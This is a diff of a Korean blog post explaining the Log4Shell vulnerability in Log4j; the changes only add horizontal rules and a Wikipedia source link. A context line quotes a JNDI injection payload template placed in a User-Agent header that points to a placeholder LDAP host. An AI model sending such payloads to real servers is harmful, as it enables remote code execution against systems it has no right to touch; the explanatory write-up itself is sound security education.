@@ -33,7 +33,7 @@ Log4j는 Apache Software Foundation에서 개발한 인기있는 [로깅 유틸�
 
 
 
-
+-----
 
 ## Log4j 취약점
 
@@ -49,7 +49,7 @@ Apache Log4j 2의 일부 기능에는 **재귀 분석 기능(Recursive Analysis 
 
 
 
-
+-----
 
 ## JNDI를 이용한 공격
 
@@ -81,7 +81,7 @@ User-Agent : ${jndi:ldap://<host>:<port>/<path>}
 
 
 
-
+-----
 
 ## Log4Shell 취약점은 사상 최약의 취약점?
 
@@ -96,7 +96,7 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
 
 
 
-
+-----
 
 ## 영향 받는 버전
 
@@ -107,7 +107,7 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
 
 
 
-
+-----
 
 ## 점검 방법(1)
 
@@ -168,7 +168,7 @@ Completed in 0.42 seconds
 
 
 
-
+-----
 
 ## 해결방법
 
@@ -185,7 +185,7 @@ Completed in 0.42 seconds
 
 -----
 
-출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)
+출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389), [Wiki](https://ko.wikipedia.org/wiki/Log4j)
 
 -----
 
